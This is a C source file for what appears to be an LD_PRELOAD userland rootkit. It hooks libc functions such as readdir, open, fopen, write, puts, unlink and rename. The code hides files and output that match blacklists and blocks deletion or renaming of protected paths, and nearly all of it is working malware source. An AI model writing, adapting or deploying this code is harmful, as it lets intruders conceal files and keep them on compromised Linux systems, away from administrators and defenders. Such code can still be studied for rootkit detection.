/**
 * @file hooks.c
 * @author 0xff
 * @brief All of our hooked functions.
 * @version 1.0
 * @date 2022-06-29
 * 
 * @copyright Copyright (c) 2022 0xff
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>. 
 */


#include "hooks.h"

/**
 * @brief Checks if the given string is blacklisted.
 * 
 * @param string The string to be checked. 
 * @return true If the string is blacklisted, this is returned. 
 * @return false If the string is NOT blacklisted, this is returned.
 */

bool check_blacklisted_strings(const char *string) {
  for (unsigned int i = 0; i < sizeof(blacklisted_strings) / sizeof(blacklisted_strings[0]); ++i)
    if (strstr(string, blacklisted_strings[i]))
      return true;
  return false;
}

/**
 * @brief Checks if the given filename is blacklisted.
 * 
 * @param filename The filename to be checked.
 * @return true If the filename is blacklisted, this is returned.
 * @return false If the filename is NOT blacklisted, this is returned.
 */

bool check_blacklisted_filenames(const char *filename) {
  for (unsigned int i = 0; i < sizeof(blacklisted_filenames) / sizeof(blacklisted_filenames[0]); ++i)
    if (strstr(filename, blacklisted_filenames[i]))
      return true;
  return false;
}

/**
 * @brief Write to a file descriptor.
 * 
 * @param fd From the 'buf' argument, it writes to the file referred to by the file descriptor 'fd'.
 * @param buf Writes from this buffer.
 * @param count Writes up to the amount of bytes specified.
 * @return ssize_t 
 */

ssize_t write(int fd, const void *buf, size_t count) {
  ssize_t (*temp_write)(int fd, const void *buf, size_t count) = dlsym(RTLD_NEXT, "write");

#ifdef DEBUG
  printf("[-] write(); called!\n");
#endif

  if (check_blacklisted_strings(buf))
    return -1;

  return temp_write(fd, buf, count);
}

/**
 * @brief Output of characters and strings. 
 * 
 * @param s The string.
 * @return int  
 */

int puts(const char *s) {
  int (*temp_puts)(const char *s) = dlsym(RTLD_NEXT, "puts");

/* 
 * no alert that the puts(); function has been called
 * because it's super annoying trying to read the list
 * and it's all mixed with puts(); and other functions.
*/

  if (check_blacklisted_strings(s))
    return EOF;

  return temp_puts(s);
}

/**
 * @brief Open and possibly create a file.
 * 
 * @param pathname The file.
 * @param flags This parameter is used for specifying access modes amongst other things.
 * @return int 
 */

int open(const char *pathname, int flags) {
  int (*temp_open)(const char *pathname, int flags) = dlsym(RTLD_NEXT, "open");

#ifdef DEBUG
  printf("[-] open(); called!\n");
#endif

  if (check_blacklisted_filenames(pathname))
    return -1;
  
  return temp_open(pathname, flags);
}

/**
 * @brief Stream open functions.
 * 
 * @param pathname The pathname.
 * @param mode The mode.
 * @return FILE* 
 */

FILE *fopen(const char *pathname, const char *mode) {
  FILE *(*temp_fopen)(const char *pathname, const char *mode) = dlsym(RTLD_NEXT, "fopen");

#ifdef DEBUG
  printf("[-] fopen(); called!\n");
#endif

  if (check_blacklisted_filenames(pathname))
    return NULL;
  
  return temp_fopen(pathname, mode);
}

/**
 * @brief Stream open functions.
 * 
 * @param pathname The pathname.
 * @param mode The mode.
 * @return FILE* 
 */

FILE *fopen64(const char *pathname, const char *mode) {
  FILE *(*temp_fopen64)(const char *pathname, const char *mode) = dlsym(RTLD_NEXT, "fopen64");

#ifdef DEBUG
  printf("[-] fopen64(); called!\n");
#endif

  if (check_blacklisted_filenames(pathname))
    return NULL;
  
  return temp_fopen64(pathname, mode);
}

/**
 * @brief Read a directory.
 * 
 * @param dirp Directory stream.
 * @return struct dirent* 
 */

struct dirent *readdir(DIR *dirp) {
  struct dirent *dir, *(*temp_readdir)(DIR *dirp) = dlsym(RTLD_NEXT, "readdir");

#ifdef DEBUG
  printf("[-] readdir(); called!\n");
#endif

  while ((dir = temp_readdir(dirp)))
    if (!check_blacklisted_filenames(dir->d_name))
      return dir;
  
  return NULL;
}

/**
 * @brief Read a directory.
 * 
 * @param dirp Directory stream.
 * @return struct dirent64* 
 */

struct dirent64 *readdir64(DIR *dirp) {
  struct dirent64 *dir, *(*temp_readdir64)(DIR *dirp) = dlsym(RTLD_NEXT, "readdir64");

#ifdef DEBUG
  printf("[-] readdir64(); called!\n");
#endif

  while ((dir = temp_readdir64(dirp)))
    if (!check_blacklisted_filenames(dir->d_name))
      return dir;
  
  return NULL;
}

/**
 * @brief Delete a directory.
 * 
 * @param pathname Path of the directory. 
 * @return int 
 */

int rmdir(const char *pathname) {
  int (*temp_rmdir)(const char *pathname) = dlsym(RTLD_NEXT, "rmdir");

#ifdef DEBUG
  printf("[-] rmdir() called!\n");
#endif

  if (check_blacklisted_filenames(pathname))
    return -1;
  
  return temp_rmdir(pathname);
}

int unlink(const char *pathname) {
  int (*temp_unlink)(const char *pathname) = dlsym(RTLD_NEXT, "unlink");

#ifdef DEBUG
  printf("[-] unlink() called!\n");
#endif

  if (check_blacklisted_filenames(pathname))
    return -1;
  
  return temp_unlink(pathname);
}

int unlinkat(int dirfd, const char *pathname, int flags) {
  int (*temp_unlinkat)(int dirfd, const char *pathname, int flags) = dlsym(RTLD_NEXT, "unlinkat");


#ifdef DEBUG
  printf("[-] unlinkat() called!\n");
#endif

  if (check_blacklisted_filenames(pathname))
    return -1;
  
  return temp_unlinkat(dirfd, pathname, flags);
}

int rename(const char *oldpath, const char *newpath) {
  int (*temp_rename)(const char *oldpath, const char *newpath) = dlsym(RTLD_NEXT, "rename");

#ifdef DEBUG
  printf("[-] rename() called!\n");
#endif
  
  if (check_blacklisted_filenames(oldpath) || check_blacklisted_filenames(newpath))
    return -1;
  
  return temp_rename(oldpath, newpath);
}

int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath) {
  int (*temp_renameat)(int olddirfd, const char *oldpath, int newdirfd, const char *newpath) = dlsym(RTLD_NEXT, "renameat");

#ifdef DEBUG
  printf("[-] renameat() called!\n");
#endif

  if (check_blacklisted_filenames(oldpath) || check_blacklisted_filenames(newpath))
    return -1;

  return temp_renameat(olddirfd, oldpath, newdirfd, newpath);
}

int renameat2(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, unsigned int flags) {
  int (*temp_renameat2)(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, unsigned int flags) = dlsym(RTLD_NEXT, "renameat2");
  /* ^ goes over 80 characters which is bad, i know, i don't care for now. */

#ifdef DEBUG
  printf("[-] renameat2() called!\n");
#endif

  if (check_blacklisted_filenames(oldpath) || check_blacklisted_filenames(newpath))
    return -1;

  return temp_renameat2(olddirfd, oldpath, newdirfd, newpath, flags);
}
